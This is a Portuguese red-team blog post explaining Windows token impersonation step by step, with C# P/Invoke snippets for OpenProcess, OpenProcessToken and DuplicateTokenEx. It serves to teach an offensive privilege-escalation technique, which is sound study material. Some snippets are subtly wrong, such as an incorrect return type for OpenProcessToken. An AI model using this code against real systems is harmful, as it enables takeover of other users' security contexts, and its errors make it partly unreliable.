---
title: "Token Impersonation: uma análise interna."
date: 2024-02-11 00:00:00 +0800
categories: [Windows, Token, Impersonation]
tags: [Red Team]
---

![Desktop View](https://i.imgur.com/O4rN4Sz.png)

O Windows não economiza quando o assunto é vetores de ataque. As inúmeras maneiras de se executar um comando, de elevar privilégios, de persistências, se tornaram uma marca registrada do sistema.

Hoje, vamos nos aprofundar numa técnica de ataque que, particularmente, acho bem interessante: **Token Impersonation**.

Basicamente, o ataque consiste nas seguintes etapas:

- Abrir um handle ao token do processo;
- Duplicar este handle (token);
- Impersonificar o token referenciado pelo handle.

## OpenProcess

Primeiramente, é necessária a abertura de um handle ao processo alvo que queremos manipular o token.

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

static void Main(string[] args)
{
	IntPtr hProcess = OpenProcess(0x1000/*PROCESS_QUERY_LIMITED_INFORMATION*/, false, Convert.ToInt32(args[0]));

	Console.WriteLine(
		hProcess == IntPtr.Zero
		? $"OpenProcess ERROR: {Marshal.GetLastWin32Error()}"
		: $"OpenProcess SUCCESS: {hProcess}"
	);
}
```

>`PROCESS_QUERY_LIMITED_INFORMATION (0x1000)`: o nível de acesso que o handle terá. Esta é a permissão mínima necessária para manipular tokens de processos.
{: .prompt-info }

Note que foi aberto um handle ao processo. A variável que armazenará este handle é a `hProcess`, que utilizaremos posteriormente nas próximas APIs.

## OpenProcessToken

Agora o objetivo é abrir um handle para o token do processo. Para isso, a `OpenProcessToken` desempenha a função necessária para esta etapa.

```csharp
[DllImport("advapi32", SetLastError = true)]
static extern IntPtr OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

static void Main(string[] args)
{
	IntPtr tokenPtr = OpenProcessToken(hProcess, 0x0002/*TOKEN_DUPLICATE*/, out IntPtr hToken);
	Console.WriteLine(
		tokenPtr == IntPtr.Zero
		? $"OpenProcessToken ERROR: {Marshal.GetLastWin32Error()}"
		: $"OpenProcessToken SUCCESS: {hToken}" // hToken = handle do token
	);

	if (hProcess == IntPtr.Zero) Environment.Exit(0);
	CloseHandle(hProcess);
	CloseHandle(tokenPtr);
}
```

Onde:

- `DesiredAccess`: especifica uma máscara de acesso que especifica os tipos solicitados de acesso ao token.
- `TokenHandle`: o handle do token de acesso do processo.


Ainda falando sobre a [máscara de acesso do token](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects), ela trabalha de forma bastante similar com o `processAccess` do `OpenProcess`. Esta flag é necessária para especificarmos qual o nível de acesso que teremos sobre o token.

Neste caso, como este token (`hToken`) será duplicado posteriormente, a única permissão necessária é a `TOKEN_DUPLICATE`, representada pelo valor `0x0002`.

## DuplicateTokenEx

Como vimos, já temos um handle em aberto ao token representada pela variável `hToken`. O próximo passo agora é duplicá-lo para que possamos impersonificá-lo posteriormente.

```csharp
enum SECURITY_IMPERSONATION_LEVEL
{
	SecurityAnonymous,
	SecurityIdentification,
	SecurityImpersonation,
	SecurityDelegation
}

enum TOKEN_TYPE
{
	TokenPrimary = 1,
	TokenImpersonation
}

[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool DuplicateTokenEx(
	IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
	SECURITY_IMPERSONATION_LEVEL impersonationLevel, TOKEN_TYPE tokenType, out IntPtr hNewToken
);

static void Main(string[] args)
{
	bool duplicate = DuplicateTokenEx(
		hToken,
		0x02000000 /*MAXIMUM_ALLOWED*/,
		IntPtr.Zero /*default security descriptor*/,
		SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
		TOKEN_TYPE.TokenImpersonation,
		out IntPtr hNewToken
	);

	Console.WriteLine(
		duplicate == false
		? $"DuplicateTokenEx ERROR: {Marshal.GetLastWin32Error()}"
		: $"DuplicateTokenEx SUCCESS: {hNewToken}"
	);

	if (hNewToken == IntPtr.Zero) Environment.Exit(0);
	CloseHandle(hToken);
}
```

Como vimos, diversos valores são repassados. Vamos nos atentar aos principais:

- `dwDesiredAccess`: nível de acesso do token duplicado.
- `SECURITY_IMPERSONATION_LEVEL`: o nível de segurança de impersonificação, representando o grau em que um processo servidor pode agir em nome de um processo cliente.
- `TOKEN_TYPE`: o tipo do token, podendo ser um primário (um criado do zero, diretamente pelo kernel), ou um impersonificado.

- O valor `0x02000000` é repassado no `dwDesiredAccess`. Este valor simboliza o MAXIMUM_ALLOWED, que significa o máximo permitido.

- O valor `SecurityImpersonation` é repassado no `SECURITY_IMPERSONATION_LEVEL`. Este valor simboliza que o servidor pode impersonificar o contexto de segurança do cliente.

- O valor `TokenImpersonation` é repassado no `TOKEN_TYPE`. Este valor simboliza que o token será do tipo impersonificado.
